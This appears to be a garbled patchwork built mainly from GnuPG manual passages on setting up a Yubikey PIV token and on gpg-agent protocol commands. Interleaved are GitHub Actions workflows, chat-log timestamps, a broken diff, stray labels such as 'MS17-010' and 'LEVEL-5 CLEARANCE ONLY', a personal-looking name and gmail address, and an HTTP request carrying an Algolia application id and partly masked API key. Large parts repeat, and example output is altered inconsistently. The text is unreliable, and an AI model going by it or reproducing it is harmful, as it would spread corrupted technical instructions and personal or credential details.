The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt

MS17-010

000006

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE722

S: D (rsa (n 326487324683264) (e 10001)))

S OK key created

ISTRUSTED +LISTTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:Ob:81> +GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P

S: D 340387563485634856435645634856438576457A P

S: D FEDC6532453745367D83474357495743757435D S

S: OK S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 +--auto-key-import https://www.gnupg.org/documentation/manuals/

9:16 298 signal operators › general INQUIRY <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:Ob:81> +GpgAgent returns a list of trusted keys line by line: + + S: D 000000001234454556565656677878AF2F1ECCFF P

S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367D83474357495743757435D S
S: OK S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 +--auto-key-import https://www.gnupg.org/documentation/manuals/ gnupg/Agent-Options.html#option- _002d_002dhomedir --options file gnupg directory --homedir dir 05 council mainframe Ai Today at 7:54 PM -V --verbose gpgv pgpfile gpgu sigfile [datafile] Message "298 signal operators --verbose gpgv pgpfile gpgv sigfile [datafile] sigfile is the detached signature (either ASCIl- armored or binary) and datafile -stain HOME ~/.gnupg/trustedkeys.grg The default keyring with the allowed keys. gpg(1) -I --interactive debug-level level basic --enable-progress-filter 9 it. --status-fd n n. --status-file file 1 Same as --status-td, except the status data is written to file file. 05 council mainframe Ai Today at 8:02 PM file. Use socket:// --log-time --attribute-file -sig-notation {name=value) I --cert-notation {name=value} -N, --set-notation {name-value} keyname@domain.example.com name Notation are sionatures %k" will be exnanded into Message "298 signal operators general ID of the key making the signature, "%S" into the long key ID of the key making the signature, "⅑g" into the fingerprint of the key making the signature (which might be a subkey), "%p" into the fingerprint of the primary key of the key making the signature, "%c" into the signature count from the OpenPGP smartcard, and "%%" results in a single "%". %k, %K, and %f are only meaningful when making a key signature (certification), and %c is only meaningful when using the OpenPGP smartcard. policy-url 05 council mainframe Ai Today at 8:09 PM string=(|URL) --use-embedded-filename personal-digest-preferences cf. --s2k-mode --no-allow-non-selfsigned-uid 05 council mainframe Ai Today at 8:17 PM --allow-old-cipher-algos --keyring --with-key-data I Print key listings delimited by colons (like --with- colons --list-signatures --list-sigs --list-keys, but the signatures are listed too. This command has the same effect as using --list-keys with --with-sig-list. Note that in contrast to -- check-signatures gpg--list-sigs --with-colons USERID |
Message "298 signal operators
298 signal operators › general --list-keys, but the signatures are listed too. This command has the same effect as using --list-keys with --with-sig-list. Note that in contrast to -- check-signatures gpg--list-sigs--with-colons USERID | \ awk-F: '$1=="sig" &&$2=="?" {if($13){print $13} else{print $5}}' --default-new-key-algo string = algorithm change 05 council mainframe Ai Today at 8:24 PM rsa2048/cert,sign+rsa2048/encr" (or "rsa3072") can be changed to the value of what we currently call future default, which is "ed25519/ cert,sign+cv25519/encr forbid-gen-key allow-secret-key-import --no-expensive-trust-checks --default-keyserver-url name doc/DETAILS --no-encrypt-to 9 Disable the use of all --encrypt-to and --hidden- encrypt-to keys. 05 council mainframe Ai Today at 8:33 PM --armor -a Create PEM encoded output. --with-md5-fingerprint --with-validation with --import --with-key-data --list-keys + Message "298 signal operators diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
